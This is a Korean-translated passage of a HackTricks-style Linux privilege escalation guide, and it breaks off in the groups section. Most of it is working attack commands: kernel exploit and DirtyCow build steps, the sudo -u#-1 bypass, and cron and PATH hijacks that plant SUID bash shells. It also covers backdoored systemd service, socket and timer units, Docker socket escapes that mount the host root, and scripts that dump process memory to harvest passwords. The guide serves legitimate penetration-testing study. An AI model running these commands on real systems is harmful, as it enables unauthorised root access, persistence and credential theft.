# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

실행 중인 OS에 대한 정보를 알아보는 것부터 시작하자
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

만약 **have write permissions on any folder inside the `PATH`** 변수라면 일부 라이브러리나 바이너리를 hijack할 수 있습니다:
```bash
echo $PATH
```
### 환경 정보

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel 버전을 확인하여 escalate privileges에 사용할 수 있는 exploit가 있는지 확인하세요
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
다음에서 좋은 vulnerable kernel list와 일부 이미 **compiled exploits**를 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 및 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
다른 사이트들에서 일부 **compiled exploits**를 찾을 수 있는 곳: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

그 웹에서 모든 vulnerable kernel versions를 추출하려면 다음을 수행하세요:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits를 검색하는 데 도움이 될 수 있는 도구는:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, kernel 2.x용 exploit만 확인함)

항상 **Google에서 kernel version을 검색하라**, 해당 kernel 버전이 어떤 kernel exploit에 적혀 있을 수 있으므로 그 exploit가 유효한지 확신할 수 있다.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

다음에 나타나는 취약한 sudo 버전을 기반으로:
```bash
searchsploit sudo
```
다음 grep으로 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

작성자 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**smasher2 box of HTB**에서 이 vuln이 어떻게 악용될 수 있는지에 대한 **예시**를 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 더 많은 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어책 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

docker container 내부에 있다면 그 안에서 탈출을 시도할 수 있습니다:

{{#ref}}
docker-security/
{{#endref}}

## Drives

어떤 것이 **mounted and unmounted**인지, 어디에 위치해 있고 그 이유가 무엇인지 확인하세요. 만약 어떤 것이 unmounted 상태라면 mount를 시도해 개인 정보를 확인해볼 수 있습니다
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리를 열거
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한, **any compiler is installed**인지 확인하세요. 이는 일부 kernel exploit를 사용해야 할 경우 유용합니다. 사용하려는 machine(또는 유사한 machine)에서 compile하는 것이 권장되기 때문입니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 취약한 소프트웨어 설치

**설치된 패키지와 서비스의 버전**을 확인하세요. 어쩌면 오래된 Nagios 버전(예를 들어)이 있어 escalating privileges에 악용될 수 있습니다…\
더 의심스러운 설치된 소프트웨어의 버전을 수동으로 확인하는 것을 권장합니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
머신에 SSH로 접근할 수 있다면, 머신 내부에 설치된 구버전 또는 취약한 소프트웨어를 확인하기 위해 **openVAS**를 사용할 수도 있습니다.

> [!NOTE] > _해당 명령어들은 많은 정보를 출력하는데, 대부분 쓸모없을 수 있으므로 설치된 소프트웨어 버전이 알려진 exploits에 취약한지 확인하는 OpenVAS와 같은 애플리케이션 사용을 권장합니다_

## 프로세스

실행 중인 **어떤 프로세스들**인지 살펴보고, 어떤 프로세스가 **정상보다 더 많은 권한을 가지고 있는지** 확인하세요 (예: tomcat이 root로 실행되는 경우?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
또한 **프로세스 바이너리에 대한 권한을 확인하세요**, 누군가의 바이너리를 덮어쓸 수 있을지도 모릅니다.

### Process monitoring

프로세스를 모니터링하려면 [**pspy**](https://github.com/DominicBreuker/pspy)와 같은 도구를 사용할 수 있습니다. 이는 취약한 프로세스가 자주 실행되거나 특정 조건이 충족될 때 이를 식별하는 데 매우 유용할 수 있습니다.

### Process memory

일부 서버 서비스는 **자격 증명을 메모리에 평문으로 저장**합니다.\
일반적으로 다른 사용자에 속한 프로세스의 메모리를 읽으려면 **root privileges**가 필요하므로, 이는 보통 이미 root일 때 추가 자격 증명을 찾는 데 더 유용합니다.\
하지만 **일반 사용자로서 자신이 소유한 프로세스의 메모리는 읽을 수 있다는 것**을 기억하세요.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 스크립트
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해, **maps는 해당 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되는지 보여주며**, 또한 **각 매핑된 영역의 권한을 보여줍니다**.  
이 **mem** 가상 파일은 **프로세스의 메모리 자체를 노출합니다**. **maps** 파일로부터 어떤 **메모리 영역이 읽기 가능한지**와 그 오프셋을 알 수 있습니다. 이 정보를 사용해 **mem 파일에서 해당 부분으로 이동해 모든 읽기 가능한 영역을 파일로 덤프합니다**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`는 시스템의 **물리적** 메모리에 접근할 수 있게 해주며, 가상 메모리는 아니다. kernel의 가상 주소 공간은 /dev/kmem을 통해 접근할 수 있다.\
일반적으로, `/dev/mem`은 **root**와 **kmem** 그룹만 읽을 수 있다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump (linux용)

ProcDump는 Windows용 Sysinternals 툴 모음의 클래식 ProcDump 도구를 Linux용으로 재구성한 것입니다. 다음에서 받을 수 있습니다: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_수동으로 root 요구사항을 제거하고 본인이 소유한 프로세스를 덤프할 수 있습니다
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root 권한이 필요합니다)

### 프로세스 메모리에서 자격증명

#### 수동 예시

authenticator 프로세스가 실행 중이라면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
process를 dump할 수 있으며(앞의 섹션에서 process의 memory를 dump하는 다양한 방법을 확인하세요) memory 내부에서 credentials를 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 **메모리에서 평문 자격증명을 훔치며** 일부 **잘 알려진 파일**에서도 자격증명을 추출합니다. 제대로 동작하려면 root 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

스케줄된 작업이 취약한지 확인하세요. 어쩌면 root로 실행되는 스크립트를 이용할 수 있습니다 (wildcard vuln? root가 사용하는 파일을 수정할 수 있나? symlinks를 사용? root가 사용하는 디렉터리에 특정 파일을 생성?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

예를 들어, _/etc/crontab_ 안에서 다음과 같은 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_사용자 "user"가 /home/user에 쓰기 권한이 있는 것을 주목하세요_)

이 crontab에서 root 사용자가 PATH를 설정하지 않고 어떤 명령이나 스크립트를 실행하려고 한다면. 예: _\* \* \* \* root overwrite.sh_\

그러면 다음을 사용해 root shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron에서 와일드카드가 있는 스크립트를 사용하는 경우 (Wildcard Injection)

만약 스크립트가 root에 의해 실행되고 명령어 안에 “**\***”가 포함되어 있다면, 이를 이용해 예기치 않은 동작(예: privesc)을 유발할 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**만약 wildcard가 다음과 같은 경로 앞에 있다면** _**/some/path/\***_ **, 취약하지 않습니다 (심지어** _**./\***_ **도 그렇지 않습니다).**

더 많은 wildcard exploitation tricks에 대해서는 다음 페이지를 읽으세요:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script overwriting and symlink

만약 root에 의해 실행되는 **cron script를 수정할 수 있다면**, 매우 쉽게 shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root에 의해 실행되는 script가 **directory where you have full access**를 사용한다면, 해당 폴더를 삭제하고 당신이 제어하는 script를 제공하는 다른 폴더로 **create a symlink folder to another one** 하는 것이 유용할 수 있다
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 자주 실행되는 cron jobs

프로세스를 모니터링하여 1, 2 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 이용해 escalate privileges 할 수도 있습니다.

예를 들어, **0.1초마다 1분 동안 모니터링**, **실행 횟수가 적은 명령어 순으로 정렬**하고 가장 많이 실행된 명령어들을 삭제하려면 다음과 같이 할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**다음 도구도 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이 도구는 시작되는 모든 프로세스를 모니터링하고 나열합니다).

### 보이지 않는 cron jobs

코멘트 뒤에 **carriage return을 넣는 것**(without newline character)으로 cronjob을 생성할 수 있으며, 이렇게 만든 cron job은 동작합니다. 예시 (note the carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

작성할 수 있는 `.service` 파일이 있는지 확인하세요. 가능하다면 해당 파일을 **수정하여** 서비스가 **시작될 때**, **재시작될 때** 또는 **중지될 때** 당신의 **backdoor**가 **실행되도록** 할 수 있습니다 (시스템이 재부팅될 때까지 기다려야 할 수도 있습니다).\  
예를 들어 `.service` 파일 안에 **`ExecStart=/tmp/script.sh`** 로 backdoor를 넣을 수 있습니다.

### 쓰기 가능한 서비스 바이너리

서비스에서 실행되는 바이너리에 대한 **쓰기 권한**이 있다면, 해당 바이너리를 backdoors로 변경할 수 있으므로 서비스가 다시 실행될 때 backdoors가 실행됩니다.

### systemd PATH - 상대 경로

systemd에서 사용하는 PATH는 다음으로 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 어떤 폴더에 **write** 할 수 있다면 **escalate privileges** 할 수 있습니다. 다음과 같은 **relative paths being used on service configurations** 파일을 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 당신이 쓸 수 있는 systemd PATH 폴더 안에 상대 경로 바이너리와 동일한 이름의 실행 파일을 생성하면, 서비스가 취약한 동작 (**Start**, **Stop**, **Reload**)을 실행하도록 요청될 때 당신의 backdoor가 실행됩니다 (비특권 사용자는 보통 서비스를 시작/중지할 수 없지만 `sudo -l`을 사용할 수 있는지 확인하세요).

**서비스에 대해 더 알고 싶다면 `man systemd.service`를 참조하세요.**

## **타이머**

**타이머(Timers)**는 이름이 `**.timer**`로 끝나며 `**.service**` 파일이나 이벤트를 제어하는 systemd 유닛 파일입니다. **타이머**는 캘린더 시간 이벤트와 단조(monotonic) 시간 이벤트를 기본적으로 지원하고 비동기적으로 실행할 수 있어 cron의 대안으로 사용할 수 있습니다.

다음 명령으로 모든 타이머를 열거할 수 있습니다:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있으면 systemd.unit(예: `.service` 또는 `.target`)에 존재하는 항목들을 실행하도록 만들 수 있다.
```bash
Unit=backdoor.service
```
문서에서는 Unit이 다음과 같이 설명되어 있습니다:

> 이 타이머가 만료될 때 활성화할 unit입니다. 인수는 접미사가 ".timer"가 아닌 unit 이름입니다. 지정하지 않으면, 이 값은 접미사를 제외하면 timer unit과 동일한 이름을 가진 service로 기본 설정됩니다. (위 참조.) 활성화되는 unit 이름과 timer unit의 unit 이름은 접미사만 제외하고 동일하게 명명하는 것이 권장됩니다.

따라서, 이 권한을 악용하려면 다음이 필요합니다:

- systemd unit(예: `.service`) 중 **쓰기 가능한 바이너리를 실행하는** 것을 찾습니다
- **상대 경로를 실행하는** systemd unit을 찾고, 그 실행파일을 사칭하기 위해 **systemd PATH**에 대해 **쓰기 권한**을 가지고 있어야 합니다 (그 실행파일을 사칭하기 위해)

**timers에 대해 더 알아보려면 `man systemd.timer`를 확인하세요.**

### **타이머 활성화**

타이머를 활성화하려면 root 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

다음과 같이 **sockets listening for HTTP** 요청이 있을 수 있다는 점에 유의하세요 (_.socket files가 아니라 unix sockets로 동작하는 파일들을 말합니다_). 다음 명령으로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
소켓이 **HTTP 요청에 응답한다면**, 해당 소켓과 **통신**할 수 있고 때로는 **exploit some vulnerability**할 수도 있습니다.

### 쓰기 가능한 Docker 소켓

Docker 소켓(종종 `/var/run/docker.sock`에 위치함)은 보안이 필요한 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹의 멤버에게 쓰기 권한이 부여되어 있습니다. 이 소켓에 대한 쓰기 권한을 가지면 privilege escalation으로 이어질 수 있습니다. 다음은 이를 수행하는 방법과 Docker CLI를 사용할 수 없는 경우의 대안 방법들에 대한 설명입니다.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker API 직접 사용하기**

Docker CLI를 사용할 수 없는 경우에도 Docker 소켓은 Docker API와 `curl` 명령으로 조작할 수 있습니다.

1.  **List Docker Images:** 사용 가능한 이미지 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 호스트 시스템의 루트 디렉토리를 마운트하는 컨테이너를 생성하도록 요청을 전송합니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`를 사용해 컨테이너와 연결을 설정하면 그 안에서 명령을 실행할 수 있습니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는 컨테이너 내에서 호스트 파일시스템에 대한 루트 권한으로 직접 명령을 실행할 수 있습니다.

### 기타

docker 소켓에 대한 쓰기 권한이 있고 **그룹 `docker`의 구성원**이라면 [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)를 확인하세요. 만약 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)라면 해당 API를 악용할 수도 있습니다.

다음에서 **more ways to break out from docker or abuse it to escalate privileges**를 확인하세요:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션이 효율적으로 상호작용하고 데이터를 공유할 수 있게 해주는 정교한 **inter-Process Communication (IPC) system**입니다. 현대 Linux 시스템을 염두에 두고 설계되었으며, 다양한 형태의 애플리케이션 통신을 위한 견고한 프레임워크를 제공합니다.

이 시스템은 프로세스 간 데이터 교환을 향상시키는 기본적인 IPC를 지원하며, 이는 **향상된 UNIX 도메인 소켓(enhanced UNIX domain sockets)**을 연상시킵니다. 또한 이벤트나 신호를 브로드캐스트하는 데 도움을 주어 시스템 구성 요소 간의 원활한 통합을 촉진합니다. 예를 들어, 블루투스 데몬에서 걸려오는 전화에 대한 신호가 오면 음악 재생기가 자동으로 음소거되는 식으로 사용자 경험을 향상시킬 수 있습니다. 추가로, D-Bus는 원격 객체 시스템을 지원하여 애플리케이션 간의 서비스 요청과 메서드 호출을 단순화하여 전통적으로 복잡했던 과정을 간소화합니다.

D-Bus는 **allow/deny model**로 동작하며, 정책 규칙의 누적 효과에 따라 메시지 권한(메서드 호출, 신호 전송 등)을 관리합니다. 이러한 정책은 버스와의 상호작용을 지정하며, 권한을 악용하면 privilege escalation으로 이어질 수 있습니다.

예를 들어 `/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 정책은 root 사용자가 `fi.w1.wpa_supplicant1`을 소유하고, 해당 대상에게 메시지를 보내고 받을 수 있는 권한을 상세히 기술하고 있습니다.

사용자나 그룹이 지정되지 않은 정책은 모든 대상에 보편적으로 적용되며, "default" 컨텍스트 정책은 다른 특정 정책에 포함되지 않는 모든 대상에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기에서 D-Bus 통신을 enumerate 및 exploit하는 방법을 알아보세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 enumerate하고 머신의 위치를 파악하는 것은 항상 흥미롭습니다.

### 일반적인 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 열린 포트

접근하기 전에 이전에 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 항상 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic이 가능한지 확인하세요. 가능하면 일부 credentials를 획득할 수 있습니다.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

자신이 **who**인지, 어떤 **privileges**를 가지고 있는지, 시스템에 어떤 **users**가 있는지, 어떤 사용자가 **login**할 수 있는지, 그리고 어떤 사용자가 **root privileges**를 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 큰 UID

일부 Linux 버전은 **UID > INT_MAX** 사용자가 권한 상승을 할 수 있는 버그의 영향을 받았습니다. 자세한 정보: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**악용 방법:** **`systemd-run -t /bin/bash`**

### 그룹

root 권한을 줄 수 있는 어떤 그룹의 **멤버**인지 확인하세요:


{{#ref}}
